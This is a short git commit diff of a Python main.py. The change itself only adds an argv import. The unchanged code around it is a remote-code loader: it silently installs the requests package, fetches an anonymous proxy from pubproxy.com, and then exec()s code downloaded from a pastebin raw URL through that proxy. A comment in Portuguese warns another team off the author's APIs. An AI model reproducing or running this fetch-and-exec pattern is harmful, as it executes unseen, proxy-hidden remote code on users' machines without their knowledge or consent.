39c35dbbf62bf3fcce64675ff42b9fce940b847a
Bruno Parziovanni <70079144+Kiny-Kiny@users.noreply.github.com>
2021-08-18 17:49:50 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,5 @@
 # Para AkTr Team: Parem de utilizar minhas APIs sem minha permissão, agradeço.
-from os import execl; from sys import executable; from os import system
+from os import execl; from sys import executable; from os import system;from sys import argv
 try: from requests import get
 except: system('python3 -m pip install --upgrade pip && pip3 install requests');execl(executable, executable, *argv)
 try: api=get('http://pubproxy.com/api/proxy').json();ip=api['data'][0]['ip']+':'+api['data'][0]['port'];exec(get(url='https://pastebin.com/raw/WY6AQRKa', proxies={'http': ip}).text)
